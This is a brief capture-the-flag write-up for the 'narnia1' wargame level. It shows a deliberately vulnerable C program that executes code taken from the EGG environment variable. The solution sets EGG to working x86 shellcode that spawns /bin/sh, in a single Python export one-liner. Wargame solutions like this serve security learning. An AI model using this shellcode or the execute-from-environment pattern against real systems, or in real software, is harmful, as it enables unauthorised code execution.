# narnia1

## Source Code
```c
#include <stdio.h>
int main(){
    int (*ret)();  

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
}        

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```


## Objective
Spawn a shell via the EGG enviornment variable

## Solution
I set EGG to some shellcode I grabbed from shell-storm.org:

```bash
export EGG=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```
